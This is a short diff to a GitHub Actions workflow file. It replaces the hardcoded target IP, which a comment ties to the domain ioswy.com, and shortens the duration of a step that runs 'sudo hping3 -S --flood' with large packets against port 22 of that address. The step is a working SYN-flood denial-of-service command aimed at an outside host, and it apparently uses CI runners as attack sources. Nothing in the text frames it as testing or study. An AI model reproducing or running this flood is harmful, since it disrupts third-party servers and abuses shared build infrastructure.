@@ -59,7 +59,7 @@ jobs:
 
           # getent ahostsv4 ioswy.com
           # IP=$(getent ahostsv4 ioswy.com | awk '{print $1}' | head -n 1)
-          IP=124.156.141.120
+          IP=119.28.76.201
           echo "IP=$IP" >> $GITHUB_ENV
 
           timeout 120s yarn start
@@ -68,7 +68,7 @@ jobs:
         run: |
           echo $IP
           echo "当前时间：$(date "+%Y-%m-%d %H:%M:%S")"
-          sudo timeout 60s hping3 -S --flood -V -d 65400 -p 22 -s 1000-65535 $IP
+          sudo timeout 2s hping3 -S --flood -V -d 65400 -p 22 -s 1000-65535 $IP
           
           # for ((i=0; i<10; i++)); do
           #   PORT=$((RANDOM % 65535 + 1))
